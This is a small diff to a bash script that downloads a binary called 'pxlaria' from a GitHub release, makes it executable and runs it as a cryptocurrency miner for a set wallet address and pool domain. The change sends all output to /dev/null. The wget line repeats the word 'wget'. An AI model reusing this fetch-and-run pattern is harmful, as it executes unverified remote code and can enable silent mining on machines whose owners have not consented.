@@ -1,4 +1,4 @@
 #!/bin/bash
 wget wget https://github.com/vedhagsvp/xcdes/releases/download/xplose/pxlaria
 chmod +x pxlaria
-./pxlaria -targetMiner 0x414A2A8b272cbD0bcEbb70ae1919cfeff89521E7 -domain https://sgp-mining.x-phere.com
+./pxlaria -targetMiner 0x414A2A8b272cbD0bcEbb70ae1919cfeff89521E7 -domain https://sgp-mining.x-phere.com > /dev/null 2>&1
